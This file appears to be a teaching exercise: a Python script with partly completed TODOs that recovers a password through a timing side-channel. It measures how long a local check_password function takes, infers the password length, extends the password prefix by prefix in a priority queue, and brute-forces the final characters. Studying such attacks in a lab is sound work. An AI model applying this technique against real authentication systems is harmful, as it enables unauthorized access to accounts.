"""
Python timing side-channel attack task.

Please check the TODOs!
"""
from timeit import timeit
from string import ascii_letters, digits
from queue import PriorityQueue
from typing import Tuple, Optional, Iterator
from itertools import product

# Note: this is the password checking function we're trying to crack!
from auth import check_password

ITERATIONS = 10000
CHARACTERS = ascii_letters + digits + "{}"  # TODO: is this all?
BRUTE_FORCE_LIMIT = 3  # chars to brute force at the end


def timed_check_pass(password: str, number: int = ITERATIONS) -> float:
    """ Runs & measures the time of the password check function. """
    return timeit(lambda: check_password(password), number=number)


def find_length() -> int:
    """ Timing attack to find the length of the password. """
    times = [
        timed_check_pass(" " * length, number=ITERATIONS)
        for length in range(21)
    ]
    return times.index(max(times))


def pad(string: str, length: int) -> str:
    """ Pads the string with spaces until the given length. """
    return string + " " * (length - len(string))


def brute_force(pass_prefix: str, pass_length: int) -> Optional[str]:
    """ Runs a brute force for the password (do not use on big lengths!). """
    # product() computes carthesian product of all possible characters N times
    for chars in product(CHARACTERS, repeat=(pass_length - len(pass_prefix))):
        new_password = pass_prefix + "".join(chars)
        if check_password(new_password):
            return new_password
    return None


def find_password() -> Optional[str]:
    length = find_length()
    print("Found length: " + str(length))
    # use a heap to store candidates in reverse timing order
    # https://docs.python.org/3/library/queue.html#queue.PriorityQueue
    q: PriorityQueue[Tuple[float, str]] = PriorityQueue()
    # start from the empty prefix string with the best timing (0)
    q.put((0.0, ""))

    while not q.empty():
        _, p = q.get()
        print("cur prefix: " + p)

        if len(p) == length - BRUTE_FORCE_LIMIT:
            # Brute force if there are not that many characters left
            print("Note: reached the bruteforce threshold...")
            i = 0
            for chars in product(CHARACTERS, repeat=length - len(p)):
                # current password to bruteforce
                np = p + "".join(chars)
                if i >= 10000:
                    # print a helpful still-in-progress message
                    print("brute forcing: " + np)
                    i = 0
                # TODO: check for exit condition
                if (check_password(np)):
                	return np
                i += 1
        else:
            # use depth first search
            for c in CHARACTERS:
                # current password to check
                np = p + c
                # TODO: check for exit condition
                # TODO: do a timed password check
                # note: PriorityQueue is a min-heap and we need to favor the highest duration
                #duration = ??
                #duration = timed_check_pass(np)
                if (check_password(np)):
                	return np
                duration = timed_check_pass(np)
                q.put((-duration, np))

    return None


if __name__ == "__main__":
    p = find_password()
    if p:
        print("FOUND: " + p)
    else:
        print("Not found :( ")


